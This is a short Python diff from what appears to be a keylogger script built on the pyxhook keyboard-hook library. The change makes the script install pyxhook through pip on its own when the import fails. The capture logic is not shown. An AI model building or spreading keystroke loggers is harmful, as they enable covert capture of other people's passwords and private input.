@@ -1,6 +1,13 @@
 import datetime
-import pyxhook
-import re
+import subprocess
+
+#check whether required package needs to be installed 
+try:
+    import pyxhook
+except ImportError:
+    subprocess.check_call(["python", '-m', 'pip', 'install', 'pyxhook'])
+    import pyxhook
+
   
 
 def KeyBoardEvent(event):
